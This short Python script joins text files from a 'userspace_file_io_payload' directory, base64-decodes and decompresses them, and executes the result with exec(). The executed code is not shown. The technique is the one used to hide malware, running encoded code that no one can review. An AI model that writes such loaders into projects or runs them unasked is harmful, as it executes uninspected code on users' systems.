from pathlib import Path
import base64
import zlib

payload = "".join(path.read_text() for path in sorted(Path("tools/userspace_file_io_payload").glob("*.txt")))
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, "userspace-file-io-integration", "exec"))
